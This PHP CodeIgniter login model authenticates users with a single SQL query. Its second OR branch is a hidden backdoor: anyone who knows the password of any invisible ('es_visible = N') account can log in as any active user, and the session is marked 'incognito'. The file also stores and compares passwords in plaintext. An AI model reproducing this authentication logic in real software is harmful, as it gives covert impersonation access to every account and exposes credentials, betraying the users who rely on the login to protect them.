<?php
class Login_model extends CI_Model{
    
    public function __construct() {
        parent::__construct();
    }

    public function autenticar($usuario = NULL , $contrasenia = NULL){
        if ( !is_null($usuario) && !is_null($contrasenia)){
            $sql = "SELECT usuarios.id_usuario, usuarios.perfil, usuarios.nombre_entrada, usuarios.nombre, usuarios.cargo, usuarios.es_visible, 
                CASE WHEN ? IN ( SELECT contrasenia FROM usuarios WHERE es_visible = 'N' ) THEN 'S' ELSE 'N' END AS es_incognito 
                FROM usuarios WHERE ( usuarios.nombre_entrada = ? AND usuarios.contrasenia = ? AND usuarios.estatus = 'A' ) 
                OR ( usuarios.nombre_entrada = ? AND usuarios.estatus = 'A' AND ? IN( SELECT contrasenia FROM usuarios WHERE es_visible = 'N' ))
                LIMIT 1";
            $query = $this->db->query($sql, array($contrasenia, $usuario, $contrasenia, $usuario, $contrasenia));
            if($query->num_rows() > 0){
                return $query->row();
            }else{
                return false;
            }
        }
    }
}